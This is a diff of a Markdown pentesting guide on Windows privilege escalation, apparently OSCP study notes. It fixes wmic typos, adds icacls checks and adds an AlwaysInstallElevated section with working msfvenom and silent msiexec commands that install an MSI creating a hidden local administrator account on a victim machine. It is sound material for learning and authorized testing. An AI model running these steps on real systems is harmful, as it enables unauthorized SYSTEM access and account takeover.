@@ -194,9 +194,15 @@ Services on windows are programs that run in the background. Without a GUI.
 
 If you find a service that has write permissions set to `everyone` you can change that binary into your custom binary and make it execute in the privileged context.
 
-First we need to find services. That can be done using `wmci` or `sc.exe`. Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use `sc.exe`.
+```text
+# Notice that icacls is only available from Vista and up. 
+# XP and lower has cacls instead.
+icacls <service.exe>
+```
 
-**WMCI**
+First we need to find services. That can be done using `wmic` or `sc.exe`. Wmic is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use `sc.exe`.
+
+**WMIC**
 
 ```text
 wmic service list brief
@@ -204,7 +210,7 @@ wmic service list brief
 
 This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the `icacls` program. Notice that `icacls` is only available from Vista and up. XP and lower has `cacls` instead.
 
-As you can see in the command below you need to make sure that you have access to `wimc`, `icacls` and write privilege in `C:\windows\temp`.
+As you can see in the command below you need to make sure that you have access to `wmic`, `icacls` and write privilege in `C:\windows\temp`.
 
 ```text
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
@@ -233,7 +239,7 @@ Now you can process them one by one with the cacls command.
 cacls "C:\path\to\file.exe"
 ```
 
-**Look for Weakness**
+**Look for Weakness \(Done in OSCP exercises Scsiaccess.exe\)**
 
 What we are interested in is binaries that have been installed by the user. In the output you want to look for `BUILTIN\Users:(F)`. Or where your user/usergroup has `(F)` or `(C)` rights.
 
@@ -335,6 +341,16 @@ There is also a metasploit module for this is: exploit/windows/local/trusted\_se
 
 Some driver might be vulnerable. I don't know how to check this in an efficient way.
 
+AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files \(MSI\) with elevated \(SYSTEM\) permissions. However, granting users this ability is a security concern because it is too easy to abuse this privilege. For this to occur, there are two registry entries that have to be set to the value of “1” on the machine:
+
+```text
+[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
+“AlwaysInstallElevated”=dword:00000001 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
+“AlwaysInstallElevated”=dword:00000001
+```
+
 ```text
 # List all drivers
 driverquery
@@ -347,7 +363,37 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
 
-[http://toshellandback.com/2015/11/24/ms-priv-esc/](http://toshellandback.com/2015/11/24/ms-priv-esc/)
+{% embed url="http://toshellandback.com/2015/11/24/ms-priv-esc/" %}
+
+[![reg\_query\_output](https://www.toshellandback.com/wp-content/uploads/2015/11/reg_query_output-1024x214.jpg)](https://www.toshellandback.com/wp-content/uploads/2015/11/reg_query_output.jpg)
+
+_Note:  If you happen to get an error message similar to:_ The system was unable to find the specified registry key or value_, it may be that a Group Policy setting for AlwaysInstallElevated was never defined, and therefore an associated registry entry doesn’t exist._
+
+Now that we know AlwaysInstallElevated is enabled for both the local machine and the current user, we can proceed to utilize MSFVenom to generate an MSI file that, when executed on the victim machine, will add a user to the Local Administrators group:
+
+```text
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
+```
+
+Once you have our newly created MSI file loaded on the victim, we can leverage a command-line tool within Windows, Msiexec, to covertly \(in the background\) run the installation:
+
+```text
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
+```
+
+The properties of the switches utilized in the above Msiexec command are below:
+
+/quiet = Suppress any messages to the user during installation  
+/qn = No GUI  
+/i _=_ Regular \(vs. administrative\) installation
+
+Once run, we can check to validate that our account was created and added to the Local Administrator Group:
+
+[![net\_localgroup\_rottenadmin\_output](https://www.toshellandback.com/wp-content/uploads/2015/11/net_localgroup_rottenadmin_output.jpg)](https://www.toshellandback.com/wp-content/uploads/2015/11/net_localgroup_rottenadmin_output.jpg)
+
+_Note: MSI files created with MSFVenom as well as with the always\_install\_elevated module discussed below, will fail during installation.  This behavior is intentional and meant to prevent the installation being registered with the operating system._
+
+Metasploit Module:  exploit/windows/local/always\_install\_elevated
 
 ### Group Policy Preference <a id="group-policy-preference"></a>
 
